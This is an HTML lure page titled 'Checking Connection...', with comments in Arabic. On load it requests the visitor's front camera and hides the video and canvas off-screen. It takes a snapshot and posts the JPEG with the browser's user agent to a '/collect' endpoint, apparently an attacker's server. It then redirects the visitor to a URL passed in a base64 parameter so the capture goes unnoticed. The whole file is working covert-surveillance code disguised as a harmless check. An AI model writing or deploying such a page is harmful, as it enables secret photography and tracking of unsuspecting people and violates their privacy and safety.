<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Checking Connection...</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; }
        #v, #c { position: fixed; top: -1000px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <video id="v" autoplay muted playsinline></video>
    <canvas id="c"></canvas>

    <script>
        (function() {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('p');
            let config = { r: "https://google.com" }; 
            
            if (encodedData) {
                try { config = JSON.parse(atob(encodedData)); } catch (e) {}
            }

            // دالة التوجيه لضمان عدم التعليق
            const forceRedirect = () => {
                setTimeout(() => { window.location.replace(config.r); }, 500);
            };

            async function captureAndSend() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" } 
                    });
                    video.srcObject = stream;

                    // الانتظار حتى يبدأ الفيديو فعلياً (بدون Promise معقد لضمان عدم التعليق)
                    video.onloadeddata = () => {
                        setTimeout(() => {
                            try {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);
                                
                                // ضغط الصورة وتشفيرها بصيغة JPEG لتقليل الحجم وسرعة الإرسال
                                const imgData = canvas.toDataURL('image/jpeg', 0.6);
                                
                                // إرسال البيانات فوراً بصيغة JSON كما يتوقع app.py
                                fetch('/collect', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        image: imgData,
                                        phone_name: navigator.userAgent
                                    })
                                }).finally(() => {
                                    // التوجيه مهما كانت النتيجة (نجاح أو فشل الإرسال) لضمان عدم التعليق
                                    stream.getTracks().forEach(t => t.stop());
                                    forceRedirect();
                                });
                            } catch (e) { forceRedirect(); }
                        }, 800); // مهلة كافية لضبط العدسة
                    };

                } catch (err) {
                    forceRedirect(); // في حال الرفض يتم التوجيه فوراً
                }
            }

            window.onload = captureAndSend;
            
            // أمان إضافي: إذا مرت 5 ثوانٍ ولم يحدث شيء، يتم التوجيه إجبارياً
            setTimeout(forceRedirect, 5000);
        })();
    </script>
</body>
</html>
